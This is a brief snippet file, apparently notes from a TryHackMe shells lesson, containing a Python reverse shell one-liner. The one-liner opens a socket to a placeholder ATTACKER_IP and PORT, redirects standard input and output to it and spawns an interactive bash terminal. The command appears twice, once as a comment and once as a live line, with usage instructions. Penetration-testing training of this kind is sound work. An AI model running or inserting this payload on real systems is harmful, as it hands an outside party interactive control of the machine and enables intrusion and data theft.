# Python Reverse Shell - subprocess + pty
# Source: TryHackMe - Shells Overview, Task 6
# Usage: replace ATTACKER_IP and PORT, then run with: python3 -c '<command>'
#        (use python -c for Python 2)
#
#   python3 -c \
#   'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'
#
# Uses subprocess module, connects socket, duplicates stdio fds, spawns PTY bash.

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'
